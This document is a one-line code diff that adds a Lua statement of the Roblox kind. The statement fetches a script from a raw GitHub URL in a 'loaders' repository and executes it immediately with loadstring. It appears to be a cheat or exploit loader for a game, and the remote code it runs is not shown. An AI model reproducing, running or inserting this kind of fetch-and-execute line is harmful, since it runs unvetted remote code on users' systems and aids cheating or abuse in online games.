@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/forest-survival-spam3-8zztyky0oc5vub.lua"))()
